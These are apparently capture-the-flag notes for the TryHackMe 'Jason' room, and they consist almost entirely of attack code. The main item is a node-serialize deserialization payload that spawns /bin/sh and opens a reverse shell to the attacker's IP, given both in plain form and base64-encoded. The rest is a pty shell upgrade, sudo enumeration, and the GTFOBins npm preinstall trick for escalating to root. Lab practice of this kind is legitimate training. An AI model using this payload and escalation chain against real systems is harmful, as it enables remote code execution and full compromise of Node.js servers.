### My IP: 10.18.15.191
### Box IP: 10.10.114.6


```js
'{"email": "_$$ND_FUNC$$_function() { var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []);var client = new net.Socket();client.connect(1234, \"10.18.15.191\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;}()"}'
```

### Base64 Payload
eyJlbWFpbCI6ICJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKSB7IHZhciBuZXQgPSByZXF1aXJlKFwibmV0XCIpLCBjcCA9IHJlcXVpcmUoXCJjaGlsZF9wcm9jZXNzXCIpLCBzaCA9IGNwLnNwYXduKFwiL2Jpbi9zaFwiLCBbXSk7dmFyIGNsaWVudCA9IG5ldyBuZXQuU29ja2V0KCk7Y2xpZW50LmNvbm5lY3QoMTIzNCwgXCIxMC4xOC4xNS4xOTFcIiwgZnVuY3Rpb24oKXtjbGllbnQucGlwZShzaC5zdGRpbik7c2guc3Rkb3V0LnBpcGUoY2xpZW50KTtzaC5zdGRlcnIucGlwZShjbGllbnQpO30pO3JldHVybiAvYS87fSgpIn0=

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
sudo -l
```

```bash
export TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i
```

### [PrivEsc GTFO-Bins](https://gtfobins.github.io/gtfobins/npm/#shell)
### [THM - Jason](https://tryhackme.com/room/jason)